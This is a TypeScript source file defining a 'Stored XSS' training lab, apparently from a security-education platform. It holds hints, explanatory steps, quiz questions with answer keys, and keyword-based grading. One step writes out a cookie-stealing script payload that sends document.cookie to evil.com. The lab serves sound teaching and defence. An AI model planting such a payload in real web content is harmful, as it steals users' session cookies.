import { Injectable } from "@nestjs/common";
import { BaseLab } from "../base/base-lab";
import type { LabMeta, ValidationResult } from "../base/lab-definition.interface";

@Injectable()
export class XssStoredLab extends BaseLab {
  readonly meta: LabMeta = {
    slug: "xss-stored",
    name: "Stored XSS",
    description: "Explore how persistent cross-site scripting works when malicious payloads are saved to a database and served to all users.",
    objective: "Understand stored XSS mechanics, identify why it's more dangerous than reflected XSS, and learn prevention strategies.",
    category: "XSS",
    difficulty: "INTERMEDIATE",
    icon: "Database",
    xpReward: 25,
    estimatedMin: 20,
    isSandboxed: false,
    hints: [
      { key: "hint-1", order: 1, title: "How it differs from Reflected", content: "In stored XSS, the payload is saved in the database (e.g., a comment field) and served to every user who views the page.", xpCost: 5 },
      { key: "hint-2", order: 2, title: "Common vectors", content: "Comment sections, user profiles, forum posts, chat applications — anywhere user content is stored and displayed back.", xpCost: 5 },
    ],
    steps: [
      { order: 1, title: "What is Stored XSS?", instruction: "Stored XSS (also called Persistent XSS) happens when malicious script is permanently stored on the target server — in a database, forum, comment system, etc.\n\nUnlike reflected XSS, the victim doesn't need to click a malicious link — they simply visit the page." },
      { order: 2, title: "Attack Scenario", instruction: "**Scenario:** A blog comment form\n\n1. Attacker submits: `<script>document.location='https://evil.com/?c='+document.cookie</script>`\n2. The comment is saved to the database\n3. Every user who reads the post has their cookies stolen\n\n**This is worm-able** — it can propagate automatically." },
      { order: 3, title: "Defense in Depth", instruction: "**Mitigation layers:**\n1. **Input validation** — reject/sanitize on input\n2. **Output encoding** — encode on output based on context\n3. **Content Security Policy** — blocks inline scripts\n4. **HTTPOnly cookies** — prevents JS access to session cookies\n5. **SameSite cookie attribute** — reduces CSRF risk" },
    ],
    questions: [
      { key: "persistence", label: "Why is stored XSS more dangerous than reflected XSS?", type: "text", points: 15, placeholder: "It persists and affects all users...", helpText: "Think about how many victims are affected" },
      { key: "vector", label: "Name one common stored XSS attack vector:", type: "text", points: 10, placeholder: "comment section, user profile..." },
      { key: "cookie-protection", label: "Which cookie attribute prevents JavaScript from reading session cookies?", type: "text", points: 15, placeholder: "HttpOnly" },
      { key: "csp", label: "What does CSP stand for?", type: "text", points: 10, placeholder: "Content Security Policy" },
    ],
    tags: ["xss", "stored", "persistent", "client-side"],
  };

  async validate(answers: Record<string, string>): Promise<ValidationResult> {
    const feedback: ValidationResult["feedback"] = {};
    let score = 0;

    const persistence = (answers["persistence"] ?? "").toLowerCase();
    if (this.containsAny(persistence, ["all users", "everyone", "persists", "permanent", "database", "stored", "multiple", "affects"])) {
      feedback["persistence"] = { correct: true, message: "Correct!", explanation: "Stored XSS affects all users who visit the page, not just those who click a specific link. It's persistent and can spread automatically." };
      score += 15;
    } else {
      feedback["persistence"] = { correct: false, message: "Think about how many users are affected and whether the victim needs to click a link.", explanation: "Stored XSS is more dangerous because it's persistent (saved in the database) and every user who visits the page is affected — no social engineering required." };
    }

    const vector = (answers["vector"] ?? "").toLowerCase();
    if (this.containsAny(vector, ["comment", "profile", "forum", "post", "message", "review", "bio", "chat", "input"])) {
      feedback["vector"] = { correct: true, message: "Correct!", explanation: "Common vectors include comment sections, user profiles, forum posts, and any field where user content is stored and displayed." };
      score += 10;
    } else {
      feedback["vector"] = { correct: false, message: "Think about places on a website where users submit text that is later displayed to others.", explanation: "Comment sections, user profiles, forum posts, and chat messages are classic stored XSS vectors." };
    }

    const cookieProtection = (answers["cookie-protection"] ?? "").toLowerCase();
    if (this.containsAny(cookieProtection, ["httponly", "http-only", "http only"])) {
      feedback["cookie-protection"] = { correct: true, message: "Correct!", explanation: "The HttpOnly flag on cookies prevents JavaScript from accessing them via document.cookie, mitigating cookie theft via XSS." };
      score += 15;
    } else {
      feedback["cookie-protection"] = { correct: false, message: "It's a flag you set on the Set-Cookie header.", explanation: "HttpOnly is the cookie attribute that prevents JavaScript from reading session cookies, even if XSS occurs." };
    }

    const csp = (answers["csp"] ?? "").toLowerCase();
    if (this.containsAny(csp, ["content security policy", "content-security-policy", "csp"])) {
      feedback["csp"] = { correct: true, message: "Correct!", explanation: "Content Security Policy (CSP) is an HTTP header that tells browsers which scripts are allowed to execute." };
      score += 10;
    } else {
      feedback["csp"] = { correct: false, message: "It's an HTTP security header that controls script execution.", explanation: "CSP stands for Content Security Policy — it restricts which scripts can execute on your page." };
    }

    return { passed: score >= 35, score, maxScore: this.maxScore, xpEarned: this.calcXp(score, 0), feedback };
  }
}
